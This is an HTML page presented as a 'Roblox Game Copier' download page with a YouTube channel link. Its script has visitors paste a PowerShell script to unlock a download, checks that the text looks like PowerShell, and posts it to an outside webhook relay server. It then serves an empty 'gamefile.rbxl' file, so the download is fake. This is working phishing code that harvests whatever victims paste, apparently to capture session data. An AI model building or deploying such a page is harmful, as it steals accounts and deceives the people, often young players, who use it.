<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Download Page</title>
<style>
  body {
    background: linear-gradient(135deg, #3b82f6, #ec4899);
    color: #f8fafc;
    font-family: Arial, sans-serif;
    display: flex;
    flex-direction: column; /* pour pouvoir scroll */
    align-items: center;
    min-height: 100vh;
    margin: 0;
    overflow-y: auto; /* permet le scroll vertical */
    padding-bottom: 50px; /* espace pour la vidéo en bas */
  }

  /* Bouton YouTube */
  .yt-button {
    position: fixed; /* reste visible même en scroll */
    top: 20px;
    left: 20px;
    width: 56px;
    height: 56px;
    border-radius: 50%;
    background: white;
    display: flex;
    justify-content: center;
    align-items: center;
    box-shadow: 0 6px 18px rgba(0,0,0,0.3);
    cursor: pointer;
    transition: transform 0.2s;
    z-index: 10;
  }

  .yt-button:hover {
    transform: scale(1.1);
  }

  .yt-button img {
    width: 100px;  /* léger zoom sur l'image */
    height: 90px;
  }

  .box {
    background: rgba(0, 0, 0, 0.7);
    padding: 40px;
    border-radius: 16px;
    width: 450px;
    text-align: center;
    box-shadow: 0 8px 24px rgba(0,0,0,0.3);
    margin-top: 80px; /* pour laisser la place au bouton YouTube */
  }

  h2 { margin-bottom: 10px; }
  p { margin-bottom: 20px; }

  textarea {
    width: 100%;
    height: 120px;
    margin-bottom: 15px;
    border-radius: 12px;
    border: none;
    padding: 10px;
    font-family: monospace;
    font-size: 14px;
    resize: none;
  }

  button {
    width: 100%;
    padding: 12px;
    font-size: 16px;
    border-radius: 12px;
    border: none;
    cursor: not-allowed;
    background: gray;
    color: white;
    font-weight: bold;
    transition: background 0.3s, transform 0.2s;
    margin-bottom: 10px;
  }

  button.enabled {
    background: #22c55e;
    cursor: pointer;
  }

  button.enabled:hover {
    background: #16a34a;
    transform: scale(1.05);
  }

  /* Style pour la vidéo */
  .video-container {
    margin-top: 40px;
    width: 560px;
    max-width: 90%;
    height: 315px;
    border-radius: 12px;
    overflow: hidden;
    box-shadow: 0 8px 24px rgba(0,0,0,0.3);
  }

  .video-container iframe {
    width: 100%;
    height: 100%;
    border: none;
  }
</style>
</head>
<body>

<!-- Bouton chaîne YouTube -->
<a class="yt-button"
   href="https://www.youtube.com/@AndroidOwnedScripterOwner"
   target="_blank"
   title="Visit YouTube Channel">
  <img src="https://www.freeiconspng.com/uploads/youtube-logo-png-photo-0.png" alt="YouTube">
</a>

<div class="box">
  <h2>Roblox Game Copier</h2>
  <p>Submit the PowerShell to unlock the Download</p>

  <textarea id="input" placeholder="Paste here..."></textarea>
  <button id="submit" disabled>Submit script</button>
  <button id="download" disabled>Download file</button>
</div>

<!-- Embed vidéo YouTube -->
<div class="video-container">
  <iframe src="https://www.youtube.com/embed/hi7QJJ4bphU" 
          title="YouTube video player" 
          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
          allowfullscreen>
  </iframe>
</div>

<script>
const input = document.getElementById("input");
const submitBtn = document.getElementById("submit");
const downloadBtn = document.getElementById("download");

function isPowerShell(text) {
  const keywords = ["$", "Get-", "Set-", "New-", "Invoke-", "Write-Host", "Start-Process"];
  return text.trim() !== "" && keywords.some(k => text.includes(k));
}

input.addEventListener("input", () => {
  if(isPowerShell(input.value)) {
    submitBtn.disabled = false;
    submitBtn.classList.add("enabled");
  } else {
    submitBtn.disabled = true;
    submitBtn.classList.remove("enabled");
  }
});

submitBtn.addEventListener("click", () => {
  const textValue = input.value;

  fetch("https://discord-webhook-server-uhrf.onrender.com/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: textValue })
  }).then(() => {
    downloadBtn.disabled = false;
    downloadBtn.classList.add("enabled");
    submitBtn.disabled = true;
    submitBtn.classList.remove("enabled");
  }).catch(() => {
    alert("Erreur lors de l'envoi. Réessayez !");
  });
});

downloadBtn.addEventListener("click", () => {
  const blob = new Blob([""], { type: "application/octet-stream" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "gamefile.rbxl";
  a.click();
  URL.revokeObjectURL(url);
});
</script>
</body>
</html>
